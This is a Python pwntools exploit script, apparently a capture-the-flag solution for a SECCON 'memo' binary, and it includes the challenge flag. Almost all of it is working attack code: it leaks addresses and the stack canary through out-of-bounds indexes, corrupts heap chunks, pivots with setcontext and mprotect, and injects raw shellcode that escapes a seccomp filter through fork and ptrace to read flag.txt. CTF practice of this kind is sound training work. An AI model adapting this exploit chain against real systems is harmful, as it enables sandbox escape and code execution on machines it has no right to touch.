#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

# SECCON{bl4ck_l157_SECCOMP_h45_l075_0f_l00ph0l35}

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

BINARY = './memo'
TARGET = ('smemo.pwn.seccon.jp', 36384)
#TARGET = ('127.0.0.1', 2333)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)


def add(memo):
    r.sendlineafter('Exit\n> ','1 xddxdd' + p64(0x33)*13)
    if (len(memo)==0x27):
        r.sendafter('Input memo > ', memo)
    else:    
        r.sendlineafter('Input memo > ', memo)

def show(idx):
    r.sendlineafter('Exit\n> ','2')
    r.sendlineafter('Input id > ', str(idx))
    r.recvline()
    
def delete(idx):
    r.sendlineafter('Exit\n> ','3')
    r.sendlineafter('Input id > ', str(idx))

def leak(addr):
    r.sendlineafter('Exit\n> ','2 xddxdd'+p64(addr))
    r.sendlineafter('Input id > ', str(-21))
    r.recvline()
   
def free(addr):
    r.sendlineafter('Exit\n> ','3 xddxdd'+p64(addr))
    r.sendlineafter('Input id > ', str(-21))

def bye():
    r.sendlineafter('Exit\n> ','4')

code = ELF(BINARY)
libc = ELF(LIBC64)

#attach(0xE46)

add('a'*8)
add('b'*8)

show(-8)
stack_base = u64(r.recv(6).ljust(8, '\x00'))
log.info('stack base %#x' % stack_base)

#leak(stack_base)
#code.address = u64(r.recv(6).ljust(8, '\x00')) - 0x1020
#log.info('code address %#x', code.address)

leak(stack_base - 7)
cookie = u64('\x00' + r.recv(7))
log.info('cookie %#x', cookie)
code.address = u64(r.recv(6).ljust(8, '\x00')) - 0x1020
log.info('code address %#x', code.address)

leak(stack_base + 8)
libc.address = u64(r.recv(6).ljust(8, '\x00')) - 0x20830
log.info('libc address %#x', libc.address)

leak(stack_base - 0x160 + 0xd0)
heap_base = u64(r.recv(6).ljust(8, '\x00')) - 0x1020
log.info('heap base  %#x', heap_base) 

add(p64(heap_base) + p64(0x2000) + p64(0)*2 + p64(0x7)[:-1])
add(p64(0) + p64(heap_base + 0x10c8) + p64(libc.sym['mprotect']) + p64(heap_base + 0x10e0) + p64(heap_base + 0x1400)[:-1])
add(asm(shellcraft.amd64.read(0, heap_base + 0x1400, 0x200)) + '\xc3')

delete(0)
delete(1)
free(heap_base + 0x1020)

#attach(0xfc2)

add(p64(stack_base - 0x160 + 0x58))
add('xx')
add('xx')
add(p64(heap_base + 0x1080 - 0x68)+ 'x'*0x18 + p64(libc.sym['setcontext']+0x35))

bypass_seccomp = "UH\x89\xe5H\x81\xec \x01\x00\x00\xb89\x00\x00\x00\x0f\x05\x89\x85\xe0\xfe\xff\xff\x83\xbd\xe0\xfe\xff\xff\x00\x0f\x85\x88\x00\x00\x00\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\xbf\x00\x00\x00\x00\xb8e\x00\x00\x00I\x89\xca\x0f\x05\xb8\xba\x00\x00\x00\x0f\x05\xbe\x13\x00\x00\x00\x89\xc7\xb8\xc8\x00\x00\x00\x0f\x05\xbe\x00\x00\x00\x00H\x8d='\x01\x00\x00\xb8'\x00\x00\x00\x0f\x05\x89\x85\xe4\xfe\xff\xffH\x8dM\xd0\x8b\x85\xe4\xfe\xff\xff\xba@\x00\x00\x00H\x89\xce\x89\xc7\xb8\x00\x00\x00\x00\x0f\x05H\x89\x85\xe8\xfe\xff\xffH\xc7\xc2\x00\x01\x00\x00H\x8dE\xd0H\x89\xc6\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x8b\x85\xe0\xfe\xff\xff\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x89\xc7I\x89\xca\xb8=\x00\x00\x00\x0f\x05\x8b\x85\xe0\xfe\xff\xff\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\x89\xc6\xbf\x18\x00\x00\x00\xb8e\x00\x00\x00I\x89\xca\x0f\x05\x8b\x85\xe0\xfe\xff\xff\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x89\xc7I\x89\xca\xb8=\x00\x00\x00I\x89\xca\x0f\x05H\x8d\x95\xf0\xfe\xff\xff\x8b\x85\xe0\xfe\xff\xffH\x89\xd1\xba\x00\x00\x00\x00\x89\xc6\xbf\x0c\x00\x00\x00I\x89\xca\xb8e\x00\x00\x00\x0f\x05H\xc7\x85h\xff\xff\xff\x02\x00\x00\x00H\x8d\x95\xf0\xfe\xff\xff\x8b\x85\xe0\xfe\xff\xffH\x89\xd1\xba\x00\x00\x00\x00\x89\xc6\xbf\r\x00\x00\x00\xb8e\x00\x00\x00I\x89\xca\x0f\x05\x8b\x85\xe0\xfe\xff\xff\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\x89\xc6\xbf\x11\x00\x00\x00\xb8e\x00\x00\x00I\x89\xca\x0f\x05flag.txt\x00\x00" 

r.sendline(bypass_seccomp)

r.interactive()
    
